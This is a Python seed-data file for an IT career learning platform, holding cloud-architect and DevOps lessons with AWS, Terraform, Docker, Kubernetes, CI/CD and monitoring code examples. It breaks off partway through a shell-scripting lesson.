"""
Seed data for IT Career Learning Platform
Rich learning content for all career paths with lessons, code examples, and assessments.
"""
from app.models.career_path import CareerPath, CareerPathSkill
from app.models.skill import Skill, SkillLevel
from app.models.assessment import Assessment, AssessmentQuestion
import json


# ─────────────────────────────────────────────────────────────────────────────
# LEARNING CONTENT FOR EACH CAREER PATH
# ─────────────────────────────────────────────────────────────────────────────

CLOUD_ARCHITECT_CONTENT = {
    "overview": {
        "what_youll_learn": [
            "Design scalable, fault-tolerant cloud architectures on AWS",
            "Implement Infrastructure as Code with Terraform",
            "Container orchestration with Docker and Kubernetes",
            "Cloud networking, security, and cost optimization",
            "CI/CD pipelines for automated deployments"
        ],
        "prerequisites": [
            "Basic understanding of networking (TCP/IP, DNS, HTTP)",
            "Familiarity with Linux command line",
            "Some programming experience (Python or Bash scripting)"
        ],
        "career_outlook": "Cloud architects are among the highest-paid IT professionals. With enterprises migrating to the cloud at an accelerating pace, demand far exceeds supply. AWS, Azure, and GCP certifications can boost your earning potential by 20-30%."
    },
    "lessons": [
        {
            "title": "Cloud Computing Fundamentals",
            "content": "Cloud computing delivers IT resources over the internet with pay-as-you-go pricing. Instead of buying and maintaining physical data centers, you access technology services like compute, storage, and databases on an as-needed basis from a cloud provider.\n\n**The Three Service Models:**\n- **IaaS (Infrastructure as a Service):** Virtual machines, storage, networking. Example: AWS EC2, Azure VMs\n- **PaaS (Platform as a Service):** Managed platforms for deploying apps. Example: AWS Elastic Beanstalk, Heroku\n- **SaaS (Software as a Service):** Complete applications delivered via browser. Example: Gmail, Salesforce\n\n**The Five Essential Characteristics:**\n1. On-demand self-service\n2. Broad network access\n3. Resource pooling\n4. Rapid elasticity\n5. Measured service\n\n**Key AWS Services to Know:**\n- **EC2** - Virtual servers in the cloud\n- **S3** - Object storage (unlimited scalability)\n- **RDS** - Managed relational databases\n- **Lambda** - Serverless compute (pay per execution)\n- **VPC** - Isolated virtual networks\n- **IAM** - Identity and access management\n- **CloudFront** - Content delivery network (CDN)\n- **Route 53** - DNS and domain management",
            "code_examples": [
                {
                    "title": "AWS CLI - Essential Commands",
                    "language": "bash",
                    "code": "# Configure AWS CLI with your credentials\naws configure\n# AWS Access Key ID: AKIA...\n# AWS Secret Access Key: ...\n# Default region name: eu-central-1\n\n# ── EC2 (Virtual Servers) ──\n# List all running EC2 instances\naws ec2 describe-instances --filters \"Name=instance-state-name,Values=running\" \\\n  --query 'Reservations[].Instances[].[InstanceId, InstanceType, State.Name]' \\\n  --output table\n\n# Launch a new EC2 instance\naws ec2 run-instances \\\n  --image-id ami-0c55b159cbfafe1f0 \\\n  --instance-type t3.micro \\\n  --key-name my-key-pair \\\n  --security-group-ids sg-12345678 \\\n  --subnet-id subnet-12345678\n\n# ── S3 (Object Storage) ──\n# Create a bucket\naws s3 mb s3://my-company-data-2024\n\n# Upload a file\naws s3 cp ./report.pdf s3://my-company-data-2024/reports/\n\n# Sync a directory\naws s3 sync ./website s3://my-website-bucket --delete\n\n# List bucket contents\naws s3 ls s3://my-company-data-2024/reports/\n\n# ── IAM (Identity & Access) ──\n# List all IAM users\naws iam list-users --output table\n\n# Get current caller identity\naws sts get-caller-identity"
                },
                {
                    "title": "CloudFormation - Infrastructure as Code",
                    "language": "yaml",
                    "code": "# cloudformation-template.yml\nAWSTemplateFormatVersion: '2010-09-09'\nDescription: 'Simple web server stack'\n\nParameters:\n  EnvironmentType:\n    Type: String\n    Default: dev\n    AllowedValues: [dev, staging, prod]\n\nResources:\n  # VPC for network isolation\n  MyVPC:\n    Type: AWS::EC2::VPC\n    Properties:\n      CidrBlock: 10.0.0.0/16\n      EnableDnsHostnames: true\n      Tags:\n        - Key: Name\n          Value: !Sub '${EnvironmentType}-vpc'\n\n  # Web server instance\n  WebServer:\n    Type: AWS::EC2::Instance\n    Properties:\n      InstanceType: t3.micro\n      ImageId: ami-0c55b159cbfafe1f0\n      SecurityGroupIds:\n        - !Ref WebServerSG\n      UserData:\n        Fn::Base64: |\n          #!/bin/bash\n          yum update -y\n          yum install -y httpd\n          systemctl start httpd\n          echo '<h1>Hello from CloudFormation!</h1>' > /var/www/html/index.html\n\n  # Security group allowing HTTP traffic\n  WebServerSG:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupDescription: Allow HTTP\n      VpcId: !Ref MyVPC\n      SecurityGroupIngress:\n        - IpProtocol: tcp\n          FromPort: 80\n          ToPort: 80\n          CidrIp: 0.0.0.0/0\n\nOutputs:\n  WebServerIP:\n    Value: !GetAtt WebServer.PublicIp\n    Description: Public IP of the web server"
                }
            ],
            "try_it": {
                "command": "aws s3 ls",
                "hint": "List your S3 buckets. Make sure AWS CLI is configured first with 'aws configure'."
            },
            "key_takeaways": [
                "Cloud computing eliminates the need for upfront hardware investment",
                "IaaS, PaaS, and SaaS serve different levels of abstraction",
                "AWS has 200+ services - focus on core ones first (EC2, S3, VPC, IAM, RDS, Lambda)",
                "The Well-Architected Framework guides best practices"
            ]
        },
        {
            "title": "Infrastructure as Code with Terraform",
            "content": "Terraform is an open-source IaC tool by HashiCorp that lets you define cloud infrastructure in declarative configuration files. Instead of clicking through the AWS console, you write code that describes your desired state, and Terraform makes it happen.\n\n**Why Terraform?**\n- **Version Control:** Your infrastructure is in Git, just like your application code\n- **Reproducibility:** Create identical environments (dev, staging, prod) from the same code\n- **Multi-Cloud:** Works with AWS, Azure, GCP, and 1000+ providers\n- **State Management:** Terraform tracks what it created, so it knows what to update or destroy\n- **Plan Before Apply:** See exactly what changes will be made before executing them\n\n**Core Concepts:**\n- **Providers:** Plugins for interacting with cloud APIs (aws, azurerm, google)\n- **Resources:** Infrastructure objects (aws_instance, aws_s3_bucket)\n- **Variables:** Parameterize your configurations\n- **Outputs:** Export values from your infrastructure\n- **Modules:** Reusable, composable infrastructure packages\n- **State:** Terraform's record of what it manages\n\n**Terraform Workflow:**\n1. `terraform init` - Initialize providers and modules\n2. `terraform plan` - Preview changes\n3. `terraform apply` - Execute changes\n4. `terraform destroy` - Tear down infrastructure",
            "code_examples": [
                {
                    "title": "Terraform - Complete AWS Web Application",
                    "language": "hcl",
                    "code": "# main.tf - Complete AWS infrastructure\nterraform {\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \"~> 5.0\"\n    }\n  }\n}\n\nprovider \"aws\" {\n  region = var.aws_region\n}\n\n# ── Variables ──\nvariable \"aws_region\" {\n  default = \"eu-central-1\"\n}\n\nvariable \"environment\" {\n  default = \"dev\"\n}\n\n# ── VPC & Networking ──\nresource \"aws_vpc\" \"main\" {\n  cidr_block           = \"10.0.0.0/16\"\n  enable_dns_hostnames = true\n  tags = { Name = \"${var.environment}-vpc\" }\n}\n\nresource \"aws_subnet\" \"public\" {\n  count             = 2\n  vpc_id            = aws_vpc.main.id\n  cidr_block        = \"10.0.${count.index + 1}.0/24\"\n  availability_zone = data.aws_availability_zones.available.names[count.index]\n  map_public_ip_on_launch = true\n  tags = { Name = \"${var.environment}-public-${count.index + 1}\" }\n}\n\n# ── Security Group ──\nresource \"aws_security_group\" \"web\" {\n  name_prefix = \"${var.environment}-web-\"\n  vpc_id      = aws_vpc.main.id\n\n  ingress {\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n\n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}\n\n# ── EC2 Instance ──\nresource \"aws_instance\" \"web\" {\n  ami                    = \"ami-0c55b159cbfafe1f0\"\n  instance_type          = \"t3.micro\"\n  subnet_id              = aws_subnet.public[0].id\n  vpc_security_group_ids = [aws_security_group.web.id]\n\n  user_data = <<-EOF\n    #!/bin/bash\n    apt-get update -y\n    apt-get install -y nginx\n    systemctl start nginx\n  EOF\n\n  tags = { Name = \"${var.environment}-web-server\" }\n}\n\n# ── Outputs ──\noutput \"web_server_ip\" {\n  value = aws_instance.web.public_ip\n}\n\noutput \"vpc_id\" {\n  value = aws_vpc.main.id\n}"
                },
                {
                    "title": "Terraform Commands Workflow",
                    "language": "bash",
                    "code": "# Initialize Terraform (downloads providers)\nterraform init\n\n# Format your code\nterraform fmt\n\n# Validate configuration\nterraform validate\n\n# Preview changes (dry run)\nterraform plan\n\n# Apply changes (creates/updates infrastructure)\nterraform apply\n\n# Apply with auto-approve (no prompt)\nterraform apply -auto-approve\n\n# Show current state\nterraform show\n\n# List all resources in state\nterraform state list\n\n# Destroy all infrastructure\nterraform destroy\n\n# Target specific resource\nterraform apply -target=aws_instance.web\n\n# Use variables file\nterraform apply -var-file=\"production.tfvars\""
                }
            ],
            "try_it": {
                "command": "terraform init",
                "hint": "Initialize a Terraform project. Create a main.tf file first, then run terraform init."
            },
            "key_takeaways": [
                "Terraform uses declarative syntax - describe WHAT you want, not HOW to build it",
                "Always run 'terraform plan' before 'terraform apply' to review changes",
                "Use variables and modules to keep configurations DRY and reusable",
                "Store state files securely (use S3 backend for teams)",
                "Tag all resources for cost tracking and organization"
            ]
        },
        {
            "title": "Containers with Docker & Kubernetes",
            "content": "Containers package your application with all its dependencies into a standardized unit. Docker creates containers, and Kubernetes orchestrates them at scale.\n\n**Docker Fundamentals:**\n- **Image:** A read-only template containing your app, runtime, libraries, and config\n- **Container:** A running instance of an image (lightweight, isolated process)\n- **Dockerfile:** Instructions to build an image\n- **Registry:** Storage for images (Docker Hub, AWS ECR, etc.)\n\n**Why Containers?**\n- \"Works on my machine\" problem solved - identical environments everywhere\n- Lightweight (MBs, not GBs like VMs) - start in seconds\n- Isolated processes with their own filesystem, networking, and resources\n- Microservices architecture - each service in its own container\n\n**Kubernetes (K8s) Fundamentals:**\n- **Pod:** Smallest deployable unit (one or more containers)\n- **Deployment:** Manages replicas and rolling updates\n- **Service:** Stable networking endpoint for pods\n- **Ingress:** Routes external traffic to services\n- **ConfigMap/Secret:** External configuration management\n- **Namespace:** Virtual clusters for resource isolation",
            "code_examples": [
                {
                    "title": "Docker - Multi-Stage Build for Production",
                    "language": "dockerfile",
                    "code": "# ── Stage 1: Build ──\nFROM node:18-alpine AS builder\nWORKDIR /app\n\n# Install dependencies first (leverages Docker cache)\nCOPY package*.json ./\nRUN npm ci --only=production\n\n# Copy source and build\nCOPY . .\nRUN npm run build\n\n# ── Stage 2: Production ──\nFROM nginx:alpine\n\n# Copy built assets from builder stage\nCOPY --from=builder /app/build /usr/share/nginx/html\n\n# Custom nginx config\nCOPY nginx.conf /etc/nginx/conf.d/default.conf\n\n# Health check\nHEALTHCHECK --interval=30s --timeout=3s \\\n  CMD wget -q --spider http://localhost/ || exit 1\n\nEXPOSE 80\nCMD [\"nginx\", \"-g\", \"daemon off;\"]"
                },
                {
                    "title": "Kubernetes - Deploy a Web Application",
                    "language": "yaml",
                    "code": "# deployment.yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-app\n  labels:\n    app: web-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web-app\n  strategy:\n    type: RollingUpdate\n    rollingUpdate:\n      maxSurge: 1\n      maxUnavailable: 0\n  template:\n    metadata:\n      labels:\n        app: web-app\n    spec:\n      containers:\n      - name: web-app\n        image: my-app:latest\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 80\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: 80\n          initialDelaySeconds: 5\n          periodSeconds: 10\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: web-app-service\nspec:\n  type: LoadBalancer\n  selector:\n    app: web-app\n  ports:\n  - port: 80\n    targetPort: 80"
                }
            ],
            "try_it": {
                "command": "docker ps",
                "hint": "List all running Docker containers. Install Docker Desktop first if you haven't."
            },
            "key_takeaways": [
                "Use multi-stage Docker builds to minimize image size",
                "Always use specific image tags in production, never 'latest'",
                "Kubernetes Deployments manage replicas and rolling updates automatically",
                "Set resource requests and limits to prevent container resource abuse",
                "Use health checks (liveness + readiness probes) for self-healing"
            ]
        },
        {
            "title": "Cloud Security & Cost Optimization",
            "content": "Security and cost management are essential skills for any cloud architect. A misconfigured S3 bucket or an oversized EC2 instance can cost your company millions.\n\n**Security Best Practices (AWS Well-Architected):**\n- **Principle of Least Privilege:** Grant minimum permissions needed\n- **Defense in Depth:** Multiple layers of security (VPC, Security Groups, NACLs, IAM)\n- **Encryption Everywhere:** At rest (S3 SSE, EBS encryption) and in transit (TLS/SSL)\n- **Audit & Monitor:** CloudTrail for API calls, GuardDuty for threats, Config for compliance\n- **Never use root account** for daily tasks - create IAM users with MFA\n\n**Cost Optimization Strategies:**\n- **Right-sizing:** Match instance types to actual workload needs\n- **Reserved Instances:** Save 30-72% for predictable workloads\n- **Spot Instances:** Save up to 90% for fault-tolerant workloads\n- **Auto Scaling:** Scale in during low demand, scale out during peaks\n- **S3 Lifecycle Policies:** Move data to cheaper storage tiers over time\n- **Cost Explorer & Budgets:** Set alerts before costs spiral",
            "code_examples": [
                {
                    "title": "IAM Policy - Least Privilege Example",
                    "language": "json",
                    "code": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"AllowS3ReadOnly\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:GetObject\",\n        \"s3:ListBucket\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::my-app-data\",\n        \"arn:aws:s3:::my-app-data/*\"\n      ]\n    },\n    {\n      \"Sid\": \"AllowEC2DescribeOnly\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"ec2:DescribeInstances\",\n        \"ec2:DescribeSecurityGroups\"\n      ],\n      \"Resource\": \"*\",\n      \"Condition\": {\n        \"StringEquals\": {\n          \"aws:RequestedRegion\": \"eu-central-1\"\n        }\n      }\n    },\n    {\n      \"Sid\": \"DenyAllOutsideEU\",\n      \"Effect\": \"Deny\",\n      \"Action\": \"*\",\n      \"Resource\": \"*\",\n      \"Condition\": {\n        \"StringNotEquals\": {\n          \"aws:RequestedRegion\": [\"eu-central-1\", \"eu-west-1\"]\n        }\n      }\n    }\n  ]\n}"
                },
                {
                    "title": "AWS Cost Monitoring Script",
                    "language": "bash",
                    "code": "#!/bin/bash\n# Get current month's cost estimate\naws ce get-cost-and-usage \\\n  --time-period Start=2024-01-01,End=2024-01-31 \\\n  --granularity MONTHLY \\\n  --metrics BlendedCost \\\n  --group-by Type=DIMENSION,Key=SERVICE \\\n  --output table\n\n# Find unattached EBS volumes (wasting money!)\naws ec2 describe-volumes \\\n  --filters Name=status,Values=available \\\n  --query 'Volumes[].{ID:VolumeId,Size:Size,Type:VolumeType}' \\\n  --output table\n\n# Find idle EC2 instances (low CPU utilization)\naws cloudwatch get-metric-statistics \\\n  --namespace AWS/EC2 \\\n  --metric-name CPUUtilization \\\n  --dimensions Name=InstanceId,Value=i-1234567890abcdef0 \\\n  --start-time $(date -d '7 days ago' -Iseconds) \\\n  --end-time $(date -Iseconds) \\\n  --period 86400 \\\n  --statistics Average\n\n# Set a budget alert\naws budgets create-budget \\\n  --account-id 123456789012 \\\n  --budget file://monthly-budget.json \\\n  --notifications-with-subscribers file://budget-notification.json"
                }
            ],
            "try_it": {
                "command": "aws iam get-user",
                "hint": "Check your current IAM user. This is the first step in a security audit."
            },
            "key_takeaways": [
                "Security is a shared responsibility between AWS and you",
                "Always use IAM roles over access keys for services",
                "Enable MFA on all human IAM accounts, especially root",
                "Set up billing alerts BEFORE costs surprise you",
                "Tag every resource for cost allocation and management"
            ]
        }
    ]
}

DEVOPS_ENGINEER_CONTENT = {
    "overview": {
        "what_youll_learn": [
            "Build CI/CD pipelines with GitHub Actions and Jenkins",
            "Containerize applications with Docker",
            "Orchestrate containers with Kubernetes",
            "Implement Infrastructure as Code with Terraform",
            "Set up monitoring and observability with Prometheus and Grafana",
            "Automate everything with shell scripting and Python"
        ],
        "prerequisites": [
            "Basic Linux command line skills",
            "Familiarity with Git version control",
            "Understanding of web applications (HTTP, APIs)"
        ],
        "career_outlook": "DevOps engineers are essential in every tech company. The role bridges development and operations, focusing on automation, reliability, and speed. Companies adopting DevOps practices deploy 200x more frequently with 24x faster recovery from failures."
    },
    "lessons": [
        {
            "title": "CI/CD Pipelines - Automating Everything",
            "content": "Continuous Integration (CI) and Continuous Delivery/Deployment (CD) are the backbone of modern software delivery. CI automatically builds and tests every code change. CD automatically deploys tested code to production.\n\n**CI/CD Pipeline Stages:**\n1. **Source:** Developer pushes code to Git\n2. **Build:** Compile code, install dependencies, create artifacts\n3. **Test:** Run unit tests, integration tests, security scans\n4. **Stage:** Deploy to staging environment for final validation\n5. **Deploy:** Automated deployment to production\n6. **Monitor:** Track performance and errors post-deployment\n\n**Key CI/CD Tools:**\n- **GitHub Actions** - Native CI/CD for GitHub repos (recommended for new projects)\n- **Jenkins** - Most popular self-hosted CI/CD server\n- **GitLab CI** - Built into GitLab\n- **CircleCI / Travis CI** - Cloud-based CI/CD services\n- **ArgoCD** - GitOps-based continuous delivery for Kubernetes\n\n**Best Practices:**\n- Keep builds fast (under 10 minutes)\n- Fail fast - run quick checks first\n- Use caching to speed up builds\n- Never deploy what isn't tested\n- Use branch protection rules",
            "code_examples": [
                {
                    "title": "GitHub Actions - Complete CI/CD Pipeline",
                    "language": "yaml",
                    "code": "# .github/workflows/ci-cd.yml\nname: CI/CD Pipeline\n\non:\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main]\n\nenv:\n  REGISTRY: ghcr.io\n  IMAGE_NAME: ${{ github.repository }}\n\njobs:\n  # ── Stage 1: Test ──\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: '3.11'\n          cache: 'pip'\n      \n      - name: Install dependencies\n        run: |\n          pip install -r requirements.txt\n          pip install pytest pytest-cov\n      \n      - name: Run tests with coverage\n        run: pytest --cov=app --cov-report=xml -v\n      \n      - name: Upload coverage\n        uses: codecov/codecov-action@v3\n\n  # ── Stage 2: Build & Push Docker Image ──\n  build:\n    needs: test\n    runs-on: ubuntu-latest\n    if: github.ref == 'refs/heads/main'\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Log in to Container Registry\n        uses: docker/login-action@v3\n        with:\n          registry: ${{ env.REGISTRY }}\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n      \n      - name: Build and push Docker image\n        uses: docker/build-push-action@v5\n        with:\n          context: .\n          push: true\n          tags: |\n            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:latest\n            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}\n\n  # ── Stage 3: Deploy ──\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    if: github.ref == 'refs/heads/main'\n    steps:\n      - name: Deploy to production\n        run: |\n          echo \"Deploying version ${{ github.sha }}...\"\n          # kubectl set image deployment/app app=${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}"
                },
                {
                    "title": "Jenkinsfile - Declarative Pipeline",
                    "language": "groovy",
                    "code": "// Jenkinsfile\npipeline {\n    agent any\n    \n    environment {\n        DOCKER_IMAGE = 'my-app'\n        DOCKER_TAG = \"${BUILD_NUMBER}\"\n    }\n    \n    stages {\n        stage('Checkout') {\n            steps {\n                checkout scm\n            }\n        }\n        \n        stage('Test') {\n            steps {\n                sh 'pip install -r requirements.txt'\n                sh 'pytest tests/ -v --junitxml=test-results.xml'\n            }\n            post {\n                always {\n                    junit 'test-results.xml'\n                }\n            }\n        }\n        \n        stage('Build') {\n            steps {\n                sh \"docker build -t ${DOCKER_IMAGE}:${DOCKER_TAG} .\"\n            }\n        }\n        \n        stage('Deploy to Staging') {\n            when { branch 'develop' }\n            steps {\n                sh 'kubectl apply -f k8s/staging/'\n            }\n        }\n        \n        stage('Deploy to Production') {\n            when { branch 'main' }\n            steps {\n                input message: 'Deploy to production?'\n                sh 'kubectl apply -f k8s/production/'\n            }\n        }\n    }\n    \n    post {\n        failure {\n            slackSend(channel: '#deployments', message: \"Build FAILED: ${env.JOB_NAME}\")\n        }\n        success {\n            slackSend(channel: '#deployments', message: \"Build SUCCESS: ${env.JOB_NAME}\")\n        }\n    }\n}"
                }
            ],
            "try_it": {
                "command": "git log --oneline -5",
                "hint": "View your recent commits. CI/CD pipelines trigger on these commits."
            },
            "key_takeaways": [
                "CI/CD automates the boring, error-prone parts of software delivery",
                "GitHub Actions is free for public repos and easy to set up",
                "Always test before deploying - automated tests are your safety net",
                "Use branch protection to prevent direct pushes to main",
                "Cache dependencies to speed up pipeline execution"
            ]
        },
        {
            "title": "Docker - Containerization Mastery",
            "content": "Docker is the foundation of modern DevOps. Every application you deploy should be containerized for consistency, portability, and scalability.\n\n**Docker Architecture:**\n- **Docker Engine:** The runtime that builds and runs containers\n- **Images:** Immutable templates built from Dockerfiles\n- **Containers:** Running instances of images\n- **Volumes:** Persistent storage that survives container restarts\n- **Networks:** Communication between containers\n\n**Dockerfile Best Practices:**\n1. Use specific base image tags (node:18.19-alpine, not node:latest)\n2. Multi-stage builds to reduce image size by 80%+\n3. Order instructions from least to most frequently changed (leverage cache)\n4. Use .dockerignore to exclude unnecessary files\n5. Run as non-root user for security\n6. One process per container\n\n**Docker Compose** ties multiple containers together for local development - databases, caches, message queues alongside your application.",
            "code_examples": [
                {
                    "title": "Dockerfile - Python FastAPI Application",
                    "language": "dockerfile",
                    "code": "# Production-ready FastAPI Dockerfile\nFROM python:3.11-slim AS base\n\n# Security: run as non-root user\nRUN groupadd -r appuser && useradd -r -g appuser appuser\n\n# Set working directory\nWORKDIR /app\n\n# Install dependencies first (better Docker cache)\nCOPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n\n# Copy application code\nCOPY ./app ./app\n\n# Switch to non-root user\nUSER appuser\n\n# Health check\nHEALTHCHECK --interval=30s --timeout=3s --retries=3 \\\n  CMD python -c \"import urllib.request; urllib.request.urlopen('http://localhost:8000/health')\" || exit 1\n\nEXPOSE 8000\n\nCMD [\"uvicorn\", \"app.main:app\", \"--host\", \"0.0.0.0\", \"--port\", \"8000\"]"
                },
                {
                    "title": "Docker Compose - Full Stack Application",
                    "language": "yaml",
                    "code": "# docker-compose.yml\nversion: '3.8'\n\nservices:\n  backend:\n    build: ./backend\n    ports:\n      - '8000:8000'\n    environment:\n      - DATABASE_URL=postgresql://user:pass@db:5432/myapp\n      - REDIS_URL=redis://cache:6379\n    depends_on:\n      db:\n        condition: service_healthy\n    restart: unless-stopped\n    volumes:\n      - ./backend:/app  # Hot reload for development\n\n  frontend:\n    build: ./frontend\n    ports:\n      - '3000:80'\n    depends_on:\n      - backend\n    restart: unless-stopped\n\n  db:\n    image: postgres:16-alpine\n    environment:\n      POSTGRES_DB: myapp\n      POSTGRES_USER: user\n      POSTGRES_PASSWORD: pass\n    volumes:\n      - postgres_data:/var/lib/postgresql/data\n    healthcheck:\n      test: ['CMD-SHELL', 'pg_isready -U user -d myapp']\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\n  cache:\n    image: redis:7-alpine\n    ports:\n      - '6379:6379'\n\nvolumes:\n  postgres_data:"
                },
                {
                    "title": "Docker Essential Commands",
                    "language": "bash",
                    "code": "# ── Build & Run ──\ndocker build -t my-app:v1.0 .\ndocker run -d -p 8080:80 --name web my-app:v1.0\n\n# ── Inspect & Debug ──\ndocker ps                          # List running containers\ndocker logs -f web                 # Follow container logs\ndocker exec -it web /bin/sh        # Shell into container\ndocker stats                       # Live resource usage\ndocker inspect web                 # Full container details\n\n# ── Image Management ──\ndocker images                      # List local images\ndocker image prune -a              # Remove unused images\ndocker system df                   # Show disk usage\n\n# ── Docker Compose ──\ndocker compose up -d               # Start all services\ndocker compose down                # Stop all services\ndocker compose logs -f backend     # Follow specific service\ndocker compose exec backend bash   # Shell into service\n\n# ── Registry Operations ──\ndocker tag my-app:v1.0 registry.example.com/my-app:v1.0\ndocker push registry.example.com/my-app:v1.0\ndocker pull registry.example.com/my-app:v1.0"
                }
            ],
            "try_it": {
                "command": "docker --version && docker compose version",
                "hint": "Check your Docker and Docker Compose versions."
            },
            "key_takeaways": [
                "Every application should be containerized for consistency across environments",
                "Multi-stage builds dramatically reduce image size",
                "Docker Compose is essential for local development with multiple services",
                "Always use health checks in production containers",
                "Run containers as non-root users for security"
            ]
        },
        {
            "title": "Monitoring & Observability",
            "content": "You can't fix what you can't see. Monitoring and observability give you visibility into your systems' health, performance, and behavior.\n\n**The Three Pillars of Observability:**\n1. **Metrics** - Numerical measurements over time (CPU usage, request latency, error rates)\n2. **Logs** - Detailed event records (structured JSON logs are best)\n3. **Traces** - Track requests across distributed services\n\n**Key Tools:**\n- **Prometheus** - Metrics collection and alerting\n- **Grafana** - Visualization dashboards\n- **ELK Stack** (Elasticsearch + Logstash + Kibana) - Log aggregation\n- **Jaeger** / **Zipkin** - Distributed tracing\n- **PagerDuty** / **OpsGenie** - Incident alerting\n\n**The Four Golden Signals** (from Google SRE book):\n1. **Latency** - How long requests take\n2. **Traffic** - How much demand is hitting your system\n3. **Errors** - Rate of failed requests\n4. **Saturation** - How full your resources are",
            "code_examples": [
                {
                    "title": "Prometheus + Grafana - Docker Setup",
                    "language": "yaml",
                    "code": "# docker-compose.monitoring.yml\nversion: '3.8'\n\nservices:\n  prometheus:\n    image: prom/prometheus:latest\n    ports:\n      - '9090:9090'\n    volumes:\n      - ./prometheus.yml:/etc/prometheus/prometheus.yml\n    command:\n      - '--config.file=/etc/prometheus/prometheus.yml'\n      - '--storage.tsdb.retention.time=30d'\n\n  grafana:\n    image: grafana/grafana:latest\n    ports:\n      - '3001:3000'\n    environment:\n      - GF_SECURITY_ADMIN_PASSWORD=admin\n    volumes:\n      - grafana_data:/var/lib/grafana\n    depends_on:\n      - prometheus\n\n  node-exporter:\n    image: prom/node-exporter:latest\n    ports:\n      - '9100:9100'\n\nvolumes:\n  grafana_data:\n\n# ── prometheus.yml ──\n# global:\n#   scrape_interval: 15s\n# scrape_configs:\n#   - job_name: 'app'\n#     static_configs:\n#       - targets: ['backend:8000']\n#   - job_name: 'node'\n#     static_configs:\n#       - targets: ['node-exporter:9100']"
                },
                {
                    "title": "Application Metrics with Python",
                    "language": "python",
                    "code": "# Add Prometheus metrics to a FastAPI app\nfrom prometheus_client import Counter, Histogram, generate_latest\nfrom fastapi import FastAPI, Request, Response\nimport time\n\napp = FastAPI()\n\n# Define metrics\nREQUEST_COUNT = Counter(\n    'http_requests_total',\n    'Total HTTP requests',\n    ['method', 'endpoint', 'status']\n)\n\nREQUEST_LATENCY = Histogram(\n    'http_request_duration_seconds',\n    'HTTP request latency',\n    ['method', 'endpoint']\n)\n\n@app.middleware('http')\nasync def metrics_middleware(request: Request, call_next):\n    start_time = time.time()\n    response = await call_next(request)\n    duration = time.time() - start_time\n    \n    REQUEST_COUNT.labels(\n        method=request.method,\n        endpoint=request.url.path,\n        status=response.status_code\n    ).inc()\n    \n    REQUEST_LATENCY.labels(\n        method=request.method,\n        endpoint=request.url.path\n    ).observe(duration)\n    \n    return response\n\n@app.get('/metrics')\nasync def metrics():\n    return Response(\n        content=generate_latest(),\n        media_type='text/plain'\n    )"
                }
            ],
            "try_it": {
                "command": "curl -s http://localhost:8000/health | python -m json.tool",
                "hint": "Check the health endpoint - the simplest form of monitoring."
            },
            "key_takeaways": [
                "Monitor the Four Golden Signals: latency, traffic, errors, saturation",
                "Structured logging (JSON) is much easier to search and analyze than plain text",
                "Set up alerts for anomalies, not just thresholds",
                "Prometheus + Grafana is the industry standard for metrics",
                "Every production service needs health check endpoints"
            ]
        },
        {
            "title": "Linux & Shell Scripting for DevOps",
            "content": "Linux is the operating system of the cloud. Over 90% of cloud workloads run on Linux. Mastering the command line and shell scripting is non-negotiable for DevOps engineers.\n\n**Essential Linux Skills:**\n- File system navigation and manipulation\n- Process management (ps, top, kill, systemctl)\n- Networking (curl, netstat, dig, traceroute)\n- Text processing (grep, sed, awk, jq)\n- Package management (apt, yum, apk)\n- User and permission management (chmod, chown)\n\n**Bash Scripting** automates repetitive tasks. If you do something more than twice, script it.",
            "code_examples": [
                {
                    "title": "DevOps Automation Script",
                    "language": "bash",
